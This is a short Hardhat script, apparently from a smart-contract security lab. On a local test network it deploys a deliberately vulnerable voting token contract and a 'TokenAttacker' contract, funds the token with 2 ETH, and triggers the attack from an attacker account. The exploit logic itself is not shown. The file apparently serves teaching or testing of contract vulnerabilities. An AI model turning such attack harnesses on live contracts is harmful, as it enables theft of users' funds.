import { ethers } from "hardhat";

async function main() {
  const [owner, accountAttacker] = await ethers.getSigners();
  const Token = await ethers.getContractFactory("TokenWithVotingValnurable");
  const Attack = await ethers.getContractFactory("TokenAttacker");

  const token = await Token.deploy(10000, 5);
  await token.deployed();
  const attack = await Attack.deploy();
  await attack.deployed();

  const transactionHash = await owner.sendTransaction({
    to: token.address,
    value: ethers.utils.parseEther("2.0"),
  });
  console.log(await ethers.getDefaultProvider().getBalance(token.address));



  const options = {value: ethers.utils.parseEther("0.00000000000000001")};
  const result = await attack.connect(accountAttacker).attack(token.address, options);
  await result.wait();
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
